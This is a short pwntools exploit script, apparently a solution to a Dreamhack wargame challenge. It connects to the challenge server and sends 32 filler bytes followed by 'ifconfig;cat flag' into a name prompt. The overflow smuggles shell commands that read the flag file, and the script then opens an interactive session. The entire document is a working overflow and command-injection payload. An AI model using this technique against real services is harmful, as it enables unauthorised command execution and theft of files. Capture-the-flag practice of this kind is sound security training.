from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 19566
r = remote(HOST, PORT)

r.sendlineafter(b'name: ', b'A' * 32 + b'ifconfig;cat flag')
r.interactive()